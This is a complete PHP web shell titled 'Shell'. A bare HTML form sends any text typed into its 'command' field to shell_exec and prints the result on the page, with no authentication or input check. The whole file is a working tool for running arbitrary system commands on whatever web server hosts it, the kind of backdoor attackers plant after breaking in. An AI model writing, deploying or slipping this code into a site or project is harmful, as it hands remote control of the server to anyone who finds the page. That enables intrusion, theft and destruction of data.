<?php
	if (isset($_POST['command']))
	{
		$response = shell_exec($_POST['command']);
	}
?>
<!DOCTYPE html>
<html>
	<head>
		<title>Shell</title>
	</head>
	<body>
		<form action="" method="POST">
			<input type="text" name="command"/>
			<input type="submit" value="Execute"/>
		</form>
		<p>
			<?php 
				if (isset($response)) 
				{
					echo $response;
				}
			?>
		</p>
	</body>
</html>